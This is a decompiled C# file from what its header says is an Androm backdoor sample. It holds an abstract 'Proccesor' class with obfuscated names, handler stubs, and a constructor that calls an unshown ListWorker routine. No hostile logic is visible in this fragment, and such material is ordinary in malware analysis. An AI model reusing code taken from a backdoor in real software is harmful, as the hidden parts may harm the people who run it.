// Decompiled with JetBrains decompiler
// Type: TGL.Consumers.Proccesor
// Assembly: InvalidOleVariantTypeExcept, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9E82E8E9-C8CD-41F7-BA61-2A9379AE4148
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.Androm.gen-02b77b24d467552510c0f56dbde53c82e4e932dcaeb0e08fcfec00d4c359a9b9.exe

using InvalidOleVariantTypeExcept.Identifiers;
using InvalidOleVariantTypeExcept.Watchers;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using TGL.Licensing;
using TGL.Polices;

namespace TGL.Consumers
{
  public abstract class Proccesor : DicComparatorConsumer
  {
    protected abstract void endGameHandler(WriterFieldID v, Identifier cust);

    protected abstract void stopGameHandler(WriterFieldID i, Identifier second);

    protected abstract void loginHandler(WriterFieldID setup, Identifier connection);

    protected abstract void FillResolver(WriterFieldID var1, Identifier caller);

    protected abstract void deconnectionHandler(WriterFieldID reference);

    protected abstract void GetResolver(
      KeyValuePair<BehaviorAccumulateValues, string> param);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void log(BehaviorAccumulateValues spec, string selection) => this.GetResolver(new KeyValuePair<BehaviorAccumulateValues, string>(spec, selection));

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected Proccesor()
    {
      UtilsContextLicense.ListWorker();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal static bool EnableInfo() => true;

    internal static bool SelectInfo() => false;
  }
}
